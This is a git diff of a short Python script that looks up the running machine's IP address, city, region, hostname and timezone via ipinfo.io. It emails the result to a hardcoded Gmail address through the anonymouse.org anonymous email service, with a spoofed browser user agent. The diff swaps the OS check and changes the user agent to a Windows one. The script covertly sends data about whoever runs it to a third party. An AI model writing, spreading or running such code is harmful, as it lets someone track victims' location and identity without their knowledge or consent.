@@ -1,8 +1,9 @@
-from os import name, system
+from os import system
+import platform
 try:
 	import requests
 except ImportError:
-	if name == "nt":
+	if platform.system().lower() == "windows":
 		x = system("py -m pip install requests")
 		import requests
 	else:
@@ -16,15 +17,11 @@ except ImportError:
 #get ip,location,city,hostname,region,country,postal and timezone of the machine where the code is run
 data = requests.get("https://ipinfo.io/")
 msg = data.text
-
-
-
-
 to = 'gowtham758550@gmail.com'
 subject = 'check it'
 message = msg
 
-user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
+user_agent = 'Mozilla/5.0 (Windows NT 10.0;rv:78.0) Gecko/20100101 Firefox/78.0'
 sess = requests.Session()
 email_req = sess.post('http://anonymouse.org/cgi-bin/anon-email.cgi', headers={
 	'Host': 'anonymouse.org',
